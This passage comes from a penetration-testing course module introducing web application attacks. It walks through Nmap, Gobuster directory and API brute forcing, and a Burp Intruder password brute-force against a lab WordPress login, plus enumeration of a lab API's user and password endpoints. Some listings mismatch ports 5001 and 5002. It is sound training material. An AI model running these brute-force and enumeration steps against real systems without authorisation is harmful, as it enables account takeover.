# 8. Introduction to Web Application Attacks

In this Learning Module, we will cover the following Learning Units:

- Web Application Assessment Methodology
- Web Application Enumeration
- Cross-Site Scripting

In this Module, we'll begin introducing web application attacks. Modern frameworks and hosting services simplify the process of building and deploying web applications. However, these applications expose a large attack surface due to multiple dependencies, insecure configurations, immature codebases, and business-specific flaws.

Web applications are written using a variety of programming languages and frameworks, each of which can introduce specific types of vulnerabilities. Since common vulnerabilities are conceptually similar and frameworks behave similarly regardless of the underlying technology stack, we'll be able to follow similar exploitation avenues.

## 8.1. Web Application Assessment Methodology

This Learning Unit covers the following Learning Objectives:

- Understand web application security testing requirements
- Learn various types and methodologies for web application testing
- Learn about the OWASP Top10 and most common web vulnerabilities

Before we begin discussing enumeration and exploitation, let's examine the different web application penetration testing methodologies.

As a penetration tester, we can assess a web application using three different methods, depending on the type of information provided, the scope, and the engagement rules.

_White-box_ testing describes scenarios in which we have unconstrained access to the application's source code, the infrastructure it resides on, and its design documentation. Because this type of testing gives us a more comprehensive view of the application, it requires a specific skill set to find vulnerabilities in source code. The skills required for white-box testing include source code and application logic review, among others. This testing methodology might take more time, relative to the size of the codebase being reviewed.

Alternatively, _black-box_ testing (also known as a _zero-knowledge_ test) provides no information about the target application, meaning it's essential for the tester to invest significant resources into the enumeration stage. This approach is typical in bug bounty engagements.

Info

Grey-box testing occurs whenever we are provided with limited information on the target's scope, including authentication methods, credentials, or details about the framework.

This Module focuses on black-box testing to build the web application skills covered in this course.

In this and the following Modules, we will explore web application vulnerability enumeration and exploitation. Although the complexity of vulnerabilities and attacks varies, we'll demonstrate exploiting several common web application vulnerabilities in the [_OWASP Top 10 list_](https://owasp.org/www-project-top-ten/).

The OWASP Foundation aims to improve global software security and, as part of this goal, they develop the OWASP Top 10, a periodically compiled list of the most critical security risks to web applications.

Understanding these attack vectors will serve as the basic building blocks to construct more advanced attacks, as we'll learn in other Modules.

## 8.2. Web Application Assessment Tools

This Learning Unit covers the following Learning Objectives:

- Perform common enumeration techniques on web applications
- Understand web proxies theory
- Learn how Burp Suite proxy works for web application testing

Before going into the details of web application enumeration, let's familiarize ourselves with the tools of the trade. In this Learning Unit, we are going to revisit Nmap for web services enumeration, along with Wappalyzer, an online service that discloses the technology stack behind an application, and Gobuster, a tool for performing directory and file discovery.

Finally, we’ll focus on the Burp Suite proxy, which we'll rely on heavily for web application testing during this and upcoming Modules.

## 8.2.1. Fingerprinting Web Servers with Nmap

As covered in a previous Module, Nmap is the go-to tool for initial active enumeration. We should start web application enumeration from its core component, the web server, since this is the common denominator of any web application that exposes its services.

Since we found port 80 open on our target, we can proceed with service discovery. To get started, we'll rely on the **nmap** service scan (**-sV**) to identify the web server (**-p80**) banner.

```
kali@kali:~$ sudo nmap -p80  -sV 192.168.50.20
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 05:13 EDT
Nmap scan report for 192.168.50.20
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

> Listing 1 - Running Nmap scan to discover web server version

Our scan shows that Apache version 2.4.41 is running on the Ubuntu host.

To take our enumeration further, we can use service-specific Nmap NSE scripts, like _http-enum_, which performs an initial fingerprinting of the web server.

```
kali@kali:~$ sudo nmap -p80 --script=http-enum 192.168.50.20
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 06:30 EDT
Nmap scan report for 192.168.50.20
Host is up (0.10s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /login.php: Possible admin folder
|   /db/: BlogWorx Database
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /db/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'

Nmap done: 1 IP address (1 host up) scanned in 16.82 seconds
```

> Listing 2 - Running Nmap NSE http enumeration script against the target

As shown above, we discovered several interesting folders that could lead to further details about the target web application.

By using Nmap scripts, we managed to discover more application-specific information that we can add to the web server enumeration we performed earlier.

## 8.2.2. Technology Stack Identification with Wappalyzer

Along with the active information gathering we performed via Nmap, we can also passively fetch a wealth of information about the application technology stack via [_Wappalyzer_](https://www.wappalyzer.com/).

Once we have registered a free account, we can perform a Technology Lookup on the **megacorpone.com** domain.

![Figure 1: Wappalyzer findings](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/653326571abee5e23695f56cf2e90f0d-wappalyzer.png)

Figure 1: Wappalyzer findings

This quick external analysis reveals information about the OS, UI framework, web server, and more. The findings also provide information about JavaScript libraries used by the web application - this can be valuable data, as some versions of JavaScript libraries are known to be affected by several vulnerabilities.

## 8.2.3. Directory Brute Force with Gobuster

Once we have discovered an application running on a web server, our next step is to map all its publicly accessible files and directories. To do this, we would need to perform multiple queries against the target to discover any hidden paths. [_Gobuster_](https://www.kali.org/tools/gobuster/) is a tool (written in Go language) that can help us with this sort of enumeration. It uses wordlists to discover directories and files on a server through brute forcing.

Caution

Due to its brute forcing nature, Gobuster may be noisy and unsuitable for stealth engagements.

Gobuster supports various enumeration modes, including fuzzing and DNS, but for now, we’ll focus solely on the **dir** mode, which enumerates files and directories. We need to specify the target IP using the **-u** parameter and a wordlist with **-w**. The default running threads are 10; we can reduce the amount of traffic by setting a lower number via the **-t** parameter.

```
kali@kali:~$ gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.20
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/30 05:16:21 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://192.168.50.20/css/]
/db                   (Status: 301) [Size: 311] [--> http://192.168.50.20/db/]
/images               (Status: 301) [Size: 315] [--> http://192.168.50.20/images/]
/index.php            (Status: 302) [Size: 0] [--> ./login.php]
/js                   (Status: 301) [Size: 311] [--> http://192.168.50.20/js/]
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://192.168.50.20/uploads/]

===============================================================
2022/03/30 05:18:08 Finished
===============================================================
```

> Listing 3 - Running Gobuster

Under the **/usr/share/wordlists/dirb/** folder we selected the **common.txt** wordlist, which found ten resources. Four of these resources are inaccessible due to insufficient privileges (Status: 403). However, the remaining six are accessible and deserve further investigation.

## 8.2.4. Security Testing with Burp Suite

[_Burp Suite_](https://portswigger.net/burp) is a GUI-based integrated platform for web application security testing. It provides several different tools via the same user interface.

While the free Community Edition mainly contains tools used for manual testing, the commercial versions include additional features, including a formidable web application vulnerability scanner. Burp Suite has an extensive feature list and is worth investigating, but we will only explore a few basic functions in this section.

An important feature of Burp Suite is the ability to intercept HTTPS traffic. This requires using the [_Burp certificate_](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate), which is beyond the scope of this discussion.

We can find Burp Suite Community Edition in Kali under _Applications_ > _03 Web Application Analysis_ > _burpsuite_.

![Figure 2: Starting Burp Suite](https://static.offsec.com/offsec-courses/PEN-200/imgs/web/1f4a0c0d9cc38fb6f007d782aad59c26-webapp_burp_start.png)

Figure 2: Starting Burp Suite

We can also launch it from the command line with **burpsuite**:

```
kali@kali:~$ burpsuite
```

> Listing 4 - Starting Burp Suite from a terminal shell

After our initial launch, we'll first notice a warning that Burp Suite has not been tested on our [_Java Runtime Environment_](https://www.java.com/en/download/help/whatis_java.html) (JRE). Since the Kali team always tests Burp Suite on the Java version shipped with the OS, we can safely ignore this warning.

![Figure 1: Burp Suite JRE warning](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/cc8b22666df43611ed00a0916f2c019d-JRE.png)

Figure 1: Burp Suite JRE warning

Once it launches, we'll choose _Temporary project_ and click _Next_.

![Figure 3: Burp Startup](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/847002f4a1489bdd009d9a79bc3df2b1-webapp_burp_01.png)

Figure 3: Burp Startup

We'll leave _Use Burp defaults_ selected and click _Start Burp_.

![Figure 4: Burp Configuration](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/e8c7788412e81bdca407f25445950430-webapp_burp_02.png)

Figure 4: Burp Configuration

After a few moments, the UI will load.

![Figure 5: Burp Suite User Interface](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/964d0764c9fe62249a910dd344dd443c-webapp_burp_03.png)

Figure 5: Burp Suite User Interface

The initial four panes of the interface primarily serve as a summary for the Pro version scanner, so we can ignore them. Instead, we are going to focus on the features present on the tabs in the upper bar.

Let's start with the _Proxy_ tool. In general terms, a web proxy is any dedicated hardware or software meant to intercept requests and/or responses between the web client and the web server. This allows administrators and testers alike to modify any requests that are intercepted by the proxy, both manually and automatically.

Info

Some web proxies are employed to intercept company-wide TLS traffic. Known as TLS inspection devices, these perform decryption and re-encryption of the traffic and thus nullify any privacy layer provided by the HTTPS protocol.

With the Burp Proxy tool, we can intercept any request sent from the browser before it is passed on to the server. We can change almost anything about the request at this point, such as parameter names or form values. We can even add new headers. This lets us test how an application handles unexpected arbitrary input. For example, an input field might have a size limit of 20 characters, but we could use Burp Suite to modify a request to submit 30 characters.

To set up a proxy, we will first click the _Proxy_ tab to reveal several sub-tabs. We'll also disable the _Intercept_ tool, found under the _Intercept_ tab.

Tip

When _Intercept_ is enabled, we have to manually click on _Forward_ to send each request to its destination. Alternatively, we can click _Drop_ to _not_ send the request. There are times when we will want to intercept traffic and modify it, but when we are just browsing a site, having to click _Forward_ on each request is very tedious.

![Figure 6: Turning Off Intercept](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/3492eb3813a06b0dd6eddf6cbe87d560-burp01.png)

Figure 6: Turning Off Intercept

Next, we can review the proxy listener settings. The _Options_ sub-tab shows what ports are listening for proxy requests.

![Figure 7: Proxy Listeners](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/6339eb250f784e57fcf1fe57cfe81d85-burp02.png)

Figure 7: Proxy Listeners

By default, Burp Suite enables a proxy listener on **localhost:8080**. This is the host and port that our browser must connect to in order to proxy traffic through Burp Suite.

Info

Burp Suite is now shipped with its own Chromium-based native web browser, which is preconfigured to work with all Burp's features. However, for this course we are going to exclusively rely on Kali's Firefox browser because it is a more flexible and modular option.

Let’s walk through configuring the Firefox browser on our local Kali machine to use Burp Suite as a proxy.

In Firefox, we can do this by navigating to **about:preferences#general**, scrolling down to _Network Settings_, then clicking _Settings_.

Let's choose the _Manual_ option, setting the appropriate IP address and listening port. In our case, the proxy (Burp) and the browser reside on the same host, so we'll use the loopback IP address 127.0.0.1 and specify port 8080.

Info

In some testing scenarios, we might want to capture the traffic from multiple machines, so the proxy will be configured on a standalone IP. In such cases, we will configure the browser with the external IP address of the proxy.

Finally, we also want to enable this proxy server for all protocol options to ensure that we can intercept every request while testing the target application.

![Figure 8: Firefox Proxy Configuration.](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/cb25eb740f85993f49bdcee4c822b762-burp03.png)

Figure 8: Firefox Proxy Configuration.

With Burp configured as a proxy on our browser, we can close any extra open Firefox tabs and browse to **http://www.megacorpone.com**. We should find the intercepted traffic in Burp Suite under _Proxy_ > _HTTP History_.

![Figure 9: Burp Suite HTTP History](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/4ef14903af29e82939ab14dc6ce6e501-burp04.png)

Figure 9: Burp Suite HTTP History

We can now review the various requests our browser performed towards our target website.

Warning

If the browser hangs while loading the page, Intercept may be enabled. Switching it off will allow the traffic to flow uninterrupted. As we browse to additional pages, we should observe more requests in the _HTTP History_ tab.

By clicking on one of the requests, the entire dump of client requests and server responses is shown in the lower half of the Burp UI.

![Figure 10: Inspecting the first HTTP request.](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/95e5252bffb4de0f29b0e5cbd68253b8-burp05.png)

Figure 10: Inspecting the first HTTP request.

On the left pane we can visualize the client request details, with the server response on the right pane. With this powerful Burp feature, we can inspect every detail of each request performed, along with the response. We'll make use of this feature often during upcoming Modules.

Tip

Why does "detectportal.firefox.com" keep showing up in the proxy history?

A [_captive portal_](https://en.wikipedia.org/wiki/Captive_portal) is a web page that serves as a sort of gateway page when attempting to browse the Internet. It is often displayed when accepting a user agreement or authenticating through a browser to a Wi-Fi network.

To ignore this, simply enter **about:config** in the address bar. Firefox will present a warning, but we can proceed by clicking _I accept the risk!_.

Finally, search for "network.captive-portal-service.enabled" and double-click it to change the value to "false". This will prevent these messages from appearing in the proxy history.

Besides the Proxy feature, the _Repeater_ is another fundamental Burp tool. With the Repeater, we can craft new requests or easily modify the ones in History, resend them, and review the responses. To observe this in action, we can right-click a request from _Proxy_ > _HTTP History_ and select _Send to Repeater_.

![Figure 11: Sending a Request to Repeater](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/fe5cd81462a52b4f89fc5bcb5c67607b-burp06.png)

Figure 11: Sending a Request to Repeater

If we click on _Repeater_, we will observe one sub-tab with the request on the left side of the window. We can send multiple requests to Repeater, and it will display them using separate tabs. Let's send the request to the server by clicking _Send_.

![Figure 12: Burp Suite Repeater](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/7fa107a2d26b2cc19ca49975b86269bc-burp07.png)

Figure 12: Burp Suite Repeater

Burp Suite will display the raw server response on the right side of the window, which includes the response headers and un-rendered response content.

![Figure 13: Burp Suite Repeater with Request and Response](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/3519e63e6a5a2a5b144aa83e0608a23c-burp08.png)

Figure 13: Burp Suite Repeater with Request and Response

The last feature we will cover is Intruder. First, we'll need to configure our local Kali's /etc/hosts file to statically assign the IP to the _offsecwp_ website we are going to test.

Info

Some web applications will include their hostname in links and redirects. If we don't have an entry in /etc/hosts that matches the web application's hostname, our browser and other tools may not be able to follow these links.

This allows us to access the VM by hostname while bypassing DNS.

```
kali@kali:~$ cat /etc/hosts 
...
192.168.50.16 offsecwp
```

> Listing 5 - Setting up our /etc/hosts file for offsecwp

The [_Intruder_](https://portswigger.net/burp/documentation/desktop/tools/intruder/using) Burp feature, as its name suggests, is designed to automate a variety of attack angles, from the simplest to more complex web application attacks. To learn more about this feature, let's simulate a password brute forcing attack.

Since we are dealing with a new target, we can start a new Burp session and configure the Proxy as we did before. Next, we'll navigate to **http://offsecwp/wp-login.php** from Firefox. Then, we will type "admin" and "test" as respective username and password values, and click _Log in_.

![Figure 14: Simulating a failed WordPress login](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/feccd244d6f4b88c7cacd650f713d80a-burp09.png)

Figure 14: Simulating a failed WordPress login

Returning to Burp, we'll navigate to _Proxy_ > _HTTP History_, right-click on the POST request to **/wp-login.php** and select _Send to Intruder_.

![Figure 15: Sending the POST request to Intruder](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/5b81caf0153e8c312942e52703825a8a-burp10new.png)

Figure 15: Sending the POST request to Intruder

We can now select the _Intruder_ tab in the upper bar, choose the POST request we want to modify, and move to the _Positions_ sub-tab. Knowing that the user _admin_ is correct, we only need to brute force the password field. First, we'll press _Clear_ on the right bar so that all fields are cleared. We can then select the value of the _pwd_ key and press the _Add_ button on the right.

![Figure 15: Assigning the password value to the Intruder payload generator](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/1377199f64563593c0d812be0dd27fee-burp11.png)

Figure 15: Assigning the password value to the Intruder payload generator

We have now instructed the Intruder to modify only the password value on each new request. Before starting our attack, let's provide Intruder with a wordlist. Knowing that the correct password is "password", we can grab the first 10 values from the **rockyou** wordlist on Kali.

```
kali@kali:~$ cat /usr/share/wordlists/rockyou.txt | head
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
```

> Listing 6 - Copying the first 10 rockyou wordlist values

Moving to the _Payloads_ sub-tab, we can paste the above wordlist into the _Payload Options: [Simple list]_ area.

![Figure 15: Pasting the first 10 rockyou entries](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/9782513cea865bbb817f691c9354cf57-burp12.png)

Figure 15: Pasting the first 10 rockyou entries

With everything ready to start the Intruder attack, let's click on the top right _Start Attack_ button.

We can move past the Burp warning about restricted Intruder features, as this won't impact our attack. After we let the attack complete, we can observe that apart from the initial probing request, it performed 10 requests, one for each entry in the provided wordlist.

![Figure 15: Inspecting Intruder's attack results](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/a3888c57e423a1d424c3ce5203b3bc6b-burp13.png)

Figure 15: Inspecting Intruder's attack results

We'll notice that the WordPress application replied with a different _Status_ code on the 4th request, hinting that this might be the correct password value. Our hypothesis is confirmed once we try to log in to the WordPress administrative console with the discovered password.

![Figure 15: Logging to the WP admin console](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/3323fc5d7ed2b4b4b183160489a73b19-burp14.png)

Figure 15: Logging to the WP admin console

Caution

If we set Firefox to use Burp as a proxy, and we close Burp, Firefox won't work correctly.

Now that we've built a solid foundational knowledge about how Burp and other assessment tools work, let's take the next step and learn how to enumerate a target web application.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

|   |   |   |
|---|---|---|
|Web Application Assessment Tools - Walkthrough VM #1|||
|Web Application Assessment Tools - Module Exercise VM #1|||
|Web Application Assessment Tools - Module Exercise VM #2|||

#### Labs

1. We have been tasked to test the SMS Two-Factor authentication of a newly-developed web application.

The SMS verification code is made by four digits. Which Burp tool is most suited to perform a brute force attack against the keyspace?

Answer

2. Repeat the steps we covered in this Learning Unit and enumerate the targets via Nmap, Wappalyzer and Gobuster by starting _Walkthrough VM 1_.

When performing a file/directory brute force attack with Gobuster, what is the HTTP response code related to redirection?

Answer[View hints](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/web-application-enumeration-44557/inspecting-http-response-headers-and-sitemaps-44527#)

3. Start up the _Walkthrough VM 1_ and replicate the steps we covered in this Learning Unit for using Burp Suite.

What is the default port Burp proxy is listening to?

Answer

4. We have a lot of mess on our hands, and the new _DIRTBUSTER_ cleaning service is just what we need to help with the cleanup! You can visit their new site on the Module Exercise VM #1, but it is still under development. We wonder where they hid their admin portal.

Once found the admin portal, log-in with the provided credentials to obtain the flag.

Answer[View hints](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/web-application-enumeration-44557/inspecting-http-response-headers-and-sitemaps-44527#)

5. The DIRTBUSTER team finally changed their default credentials, but they are not very original. We complied at _http://target_vm/passwords.txt_ of potential passwords from the DIRTBUSTER employee contact info - I am confident the password is in there somewhere. The username is still _admin_, and the new login portal is available at the web server root folder on the Module Exercise VM #2.

Answer[View hints](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/web-application-enumeration-44557/inspecting-http-response-headers-and-sitemaps-44527#)

## 8.3. Web Application Enumeration

This Learning Unit covers the following Learning Objectives:

- Learn how to debug web application source code
- Understand how to enumerate and inspect headers, cookies, and source code
- Learn how to conduct api testing methodologies

In a previous Module, we learned how passive information gathering can play a critical role when mapping web applications, especially when public repositories or Google dorks disclose sensitive information about our target. Whether working with leaked credentials or mere application documentation, we should always refer to the information retrieved during active testing, referring back to passive findings can uncover unexplored paths.

It is important to identify the components that make up a web application before attempting to blindly exploit it. Many web application vulnerabilities are technology-agnostic. However, some exploits and payloads need to be crafted based on the technological underpinnings of the application, such as the database software or operating system. Before launching any attacks on a web application, we should first attempt to discover the technology stack in use. Technology stacks generally consist of a host operating system, web server software, database software, and a frontend/backend programming language.

Once we have enumerated the underlying stack using the methodologies we learned earlier, we'll move on to application enumeration.

We can leverage several techniques to gather this information directly from the browser. Most modern browsers include developer tools that can assist in the enumeration process.

Info

As the name implies, although Developer Tools are typically used by developers, they are useful for our purposes because they offer information about the inner workings of our target application.

We will be focusing on Firefox since it is the default browser in Kali Linux. However, most browsers include similar tools.

## 8.3.1. Debugging Page Content

A good place to start our web application information mapping is with a URL address. File extensions, which are sometimes part of a URL, can reveal the programming language the application was written in. Some extensions, like **.php**, are straightforward, but others are more cryptic and vary based on the frameworks in use. For example, a Java-based web application might use **.jsp**, **.do**, or **.html**.

File extensions on web pages are becoming less common, however, since many languages and frameworks now support the concept of [_routes_](https://en.wikipedia.org/wiki/Web_framework#URL_mapping), which allow developers to map a URI to a section of code. Applications leveraging routes use logic to determine what content is returned to the user, making URI extensions largely irrelevant.

Although URL inspection can provide some clues about the target web application, most context clues can be found in the source of the web page. The Firefox _Debugger_ tool (found in the _Web Developer_ menu) displays the page's resources and content, which varies by application. The Debugger tool may display JavaScript frameworks, hidden input fields, comments, client-side controls within HTML, JavaScript, and much more.

Let's test this out by opening Debugger while browsing the _offsecwp_ app:

![Figure 16: Using Developer Tools to Inspect JavaScript Sources](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/3d5df43dce2e06bad6444e2e674728fd-webenum01.png)

Figure 16: Using Developer Tools to Inspect JavaScript Sources

We'll notice that the application uses [_jQuery_](https://jquery.com/) version 3.6.0, a common JavaScript library. In this case, the developer [_minified_](https://en.wikipedia.org/wiki/Minification_\(programming\)) the code, making it more compact and conserving resources, which also makes it somewhat difficult to read. Fortunately, we can "prettify" code within Firefox by clicking on the _Pretty print source_ button with the double curly braces:

![Figure 17: Pretty Print Source](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/4d417edb1f3f1262db7b910f3bcd9c23-webenum02.png)

Figure 17: Pretty Print Source

After clicking the icon, Firefox will display the code in a format that is easier to read and follow:

![Figure 18: Viewing Prettified Source in Firefox](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/17a87470f481b159db4f3bc324f89663-webenum03.png)

Figure 18: Viewing Prettified Source in Firefox

We can also use the _Inspector_ tool to drill down into specific page content. Let's use Inspector to examine the _search input_ element from the WordPress home page by scrolling, right-clicking the search field on the page, and selecting _Inspect_.

![Figure 19: Selecting E-mail Input Element](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/090ae99a764c9836b28653b6380c1009-webenum04.png)

Figure 19: Selecting E-mail Input Element

This will open the Inspector tool and highlight the HTML for the element we right-clicked on.

![Figure 20: Using the Inspector Tool](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/afe14ab5a9171880200aaac19105e429-webenum05.png)

Figure 20: Using the Inspector Tool

This tool can be especially useful for quickly finding hidden form fields in the HTML source.

Now that we have some familiarity with how to use the built-in browser debugger, we'll learn how to use the Network Tool and Burp Proxy to inspect HTTP response headers.

## 8.3.2. Inspecting HTTP Response Headers and Sitemaps

We can also search server responses for additional information. There are two types of tools we can use to accomplish this task. The first type is a proxy, like Burp Suite, which intercepts requests and responses between a client and a web server, and the other is the browser's own _Network_ tool.

We will explore both approaches in this Module, but let's begin by demonstrating the _Network_ tool. We can launch it from the Firefox _Web Developer_ menu to review HTTP requests and responses. This tool shows network activity that occurs after it launches, so we must refresh the page to display traffic.

![Figure 21: Using the Network Tool to View Requests](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/8b9e710a33a627490ce29c3497f9b3eb-webenum06.png)

Figure 21: Using the Network Tool to View Requests

Clicking a request reveals additional details—in this case, we’re interested in the response headers. Response headers are a subset of [_HTTP headers_](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) that are sent in response to an HTTP request.

![Figure 22: Viewing Response Headers in the Network Tool](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/1a9e9513ea361b887835c79807bc5cbd-webenum07.png)

Figure 22: Viewing Response Headers in the Network Tool

The _Server_ header displayed above will often reveal at least the name of the web server software. In many default configurations, it also reveals the version number.

Tip

HTTP headers are not always generated solely by the web server. For instance, web proxies actively insert the [_X-Forwarded-For_](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For) header to signal the web server about the original client IP address.

Historically, headers that started with "X-" were called non-standard HTTP headers. However, [_RFC6648_](https://www.rfc-editor.org/rfc/rfc6648) now deprecates the use of "X-" in favor of a clearer naming convention.

The names or values in the response header often reveal additional information about the technology stack used by the application. Some examples of non-standard headers include _X-Powered-By_, _x-amz-cf-id_, and _X-Aspnet-Version_. Further research into these names could reveal additional information, such as that the "x-amz-cf-id" header indicates the application uses [_Amazon CloudFront_](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/RequestAndResponseBehaviorCustomOrigin.html#request-custom-headers-behavior).

_Sitemaps_ are another important element we should take into consideration when enumerating web applications.

Web applications can include sitemap files to help search engine bots crawl and index their sites. These files also include directives of which URLs _not_ to crawl - typically sensitive pages or administrative consoles, which are exactly the sort of pages we are interested in.

Inclusive directives are performed with the [_sitemaps_](https://www.sitemaps.org/) protocol, while **robots.txt** excludes URLs from being crawled.

For example, we can retrieve the **robots.txt** file from **www.google.com** with **curl**:

```
kali@kali:~$ curl https://www.google.com/robots.txt
User-agent: *
Disallow: /search
Allow: /search/about
Allow: /search/static
Allow: /search/howsearchworks
Disallow: /sdch
Disallow: /groups
Disallow: /index.html?
Disallow: /?
Allow: /?hl=
...
```

> Listing 7 - https://www.google.com/robots.txt

_Allow_ and _Disallow_ directives inform “polite” web crawlers which pages or directories may be accessed or should be avoided. In most cases, the listed pages and directories may not be interesting, and some may even be invalid. Nevertheless, sitemap files should not be overlooked because they may contain clues about the website layout or other interesting information, such as yet-unexplored portions of the target.

## 8.3.3. Enumerating and Abusing APIs

In many cases, our penetration test target is an internally built, closed-source web application that is shipped with a number of _Application Programming Interfaces_ (API). These APIs are responsible for interacting with the back-end logic and providing a solid backbone of functions to the web application.

A specific type of API named _Representational State Transfer_ (REST) is used for a variety of purposes, including authentication.

In a typical white-box test scenario, we would receive complete API documentation to help us fully map the attack surface. However, when performing a black-box test, we'll need to discover the target's API ourselves.

We can use Gobuster features to brute force the API endpoints. In this test scenario, our API gateway web server is listening on port 5001 on 192.168.50.16, so we can attempt a directory brute force attack.

API paths are often followed by a version number, resulting in a pattern such as:

```
/api_name/v1
```

> Listing 8 - API Path Naming Convention

The API name is often quite descriptive about the feature or data it uses to operate, followed directly by the version number.

With this information, let's try brute forcing the API paths using a wordlist along with the _pattern_ Gobuster feature. We can call this feature by using the **-p** option and providing a file with patterns. For our test, we'll create a simple pattern file on our Kali system containing the following text:

```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

> Listing 9 - Gobuster pattern

In this example, we are using the "{GOBUSTER}" placeholder to match any word from our wordlist, which will be appended with the version number. To keep our test simple, we'll try with only two versions.

We are now ready to enumerate the API with **gobuster** using the following command:

```
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.16:5001
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Patterns:                pattern (1 entries)
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/06 04:19:46 Starting gobuster in directory enumeration mode
===============================================================
/books/v1             (Status: 200) [Size: 235]
/console              (Status: 200) [Size: 1985]
/ui                   (Status: 308) [Size: 265] [--> http://192.168.50.16:5001/ui/]
/users/v1             (Status: 200) [Size: 241]
```

> Listing 10 - Bruteforcing API Paths

We discovered multiple hits, including two interesting entries that seem to be API endpoints, _/books/v1_ and _/users/v1_.

Tip

If we browse to the **/ui** path, we'll discover the entire APIs' documentation. Although this is common during white-box testing, is not a luxury we normally have during a black-box test.

Let's first inspect the **/users** API with **curl**.

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 241
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 09:27:50 GMT

{
  "users": [
    {
      "email": "mail1@mail.com",
      "username": "name1"
    },
    {
      "email": "mail2@mail.com",
      "username": "name2"
    },
    {
      "email": "admin@mail.com",
      "username": "admin"
    }
  ]
}
```

> Listing 11 - Obtaining Users' Information

The application returned three user accounts, including an administrative account that seems to be worth further investigation. We can use this information to launch another **Gobuster**-based brute force attack, this time targeting the _admin_ user with a smaller wordlist. To verify if any further API property is related to the _username_ property, we'll expand the API path by inserting the admin username at the very end.

```
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.16:5001/users/v1/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/06 06:40:12 Starting gobuster in directory enumeration mode
===============================================================
/email                (Status: 405) [Size: 142]
/password             (Status: 405) [Size: 142]

===============================================================
2022/04/06 06:40:35 Finished
===============================================================
```

> Listing 12 - Discovering extra APIs

The **password** API path seems enticing for our testing purposes, so we'll probe it via **curl**.

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
HTTP/1.0 405 METHOD NOT ALLOWED
Content-Type: application/problem+json
Content-Length: 142
